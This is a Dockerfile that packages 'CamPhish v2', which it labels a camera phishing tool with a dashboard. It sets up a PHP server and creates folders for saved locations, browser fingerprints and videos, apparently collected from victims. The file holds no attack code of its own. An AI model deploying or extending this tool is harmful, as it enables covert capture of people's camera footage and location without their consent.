FROM php:8.1-cli

LABEL maintainer="CamPhish v2"
LABEL description="CamPhish v2 — Camera phishing tool with dashboard"

# Install dependencies
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    bash \
    openssl \
    && rm -rf /var/lib/apt/lists/*

# Set working directory
WORKDIR /app

# Copy all project files
COPY . /app/

# Make scripts executable
RUN chmod +x camphish.sh cleanup.sh 2>/dev/null || true

# Create necessary directories
RUN mkdir -p saved_locations saved_fingerprints saved_videos dashboard

# Expose PHP server port
EXPOSE 3333

# Health check
HEALTHCHECK --interval=30s --timeout=3s \
  CMD curl -f http://localhost:3333/ || exit 1

# Default command — start PHP server
CMD ["php", "-S", "0.0.0.0:3333"]
